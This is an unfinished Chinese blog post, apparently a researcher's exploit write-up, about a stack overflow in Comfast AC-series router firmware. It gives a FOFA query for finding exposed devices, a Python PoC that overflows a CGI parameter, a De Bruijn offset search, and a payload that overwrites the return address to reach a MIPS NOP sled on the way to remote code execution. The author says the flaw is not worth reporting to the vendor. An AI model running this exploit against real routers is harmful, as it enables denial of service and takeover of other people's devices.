---
title: Comfast AC系列栈溢出 - 利用链构造
published: true
---

(未更完)这个洞，危害范围较小，没什么交漏洞库和提醒厂商的必要，没什么好说的.    

浅浅分析一下几条从栈溢出到 RCE 的普通/特殊利用链就行了，没困难可以创造困难！

fofa语法:  
```
icon_hash="-1026040476"
```

# [](#header-3)正式构造

栈溢出PoC(前提是登录):
```py
def Vul4_AC100(host: str) -> None:
	'''
	Stack OverFlow & DDoS
	Requirement: Authorized
    by leeya_bug
	'''
	import requests
    data0 = 'A' * 500
	data = '{"portal_delete_picname":"' + data0 + '"}'
	requests.post("http://" + host + "/cgi-bin/mbox-config?method=SET&section=wifilith_delete_pic_file", data = data)

Vul4_AC100(HOST的地址)
```

分析固件可知，没开栈不可执行保护，可以直接在内存里面写机器码练练手  
首先不费时不费力，用 cyclic 生成 De Bruijn 序列探测一下返回地址是什么  

```sh
$ cyclic 500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
```

将 PoC 中 data0 改成以上 De Bruijn 序列，然后调试模式运行到下断点处  

此时已知：  
栈上字符串变量的首地址为 0x2B2A6540  
De Bruijn 字符串的首地址为 0x2B2A655C

![/image/cfac100_1.png](/image/cfac100_1.png)  
而 0x6361616C 正好是 caal，也正好是 De Brujin 字符串的第 244 - 248 个字节，在栈中地址为 0x2B2A6650. 接下来更改 PoC，将程序跳转至 0x2B2A6654，并在此写下一些没有用的填充指令`move $a0,$s1`用于测试

跳到哪里无所谓，只要跳到 `move $a0,$s1` * 40 这个区间里面的任意地址就行

```python
data0  = b'A' * 248
data0 += b'\x64\x66\x2A\x2B'
data0 += b"\x25\x20\x20\x02" * 40
```

明天再更新
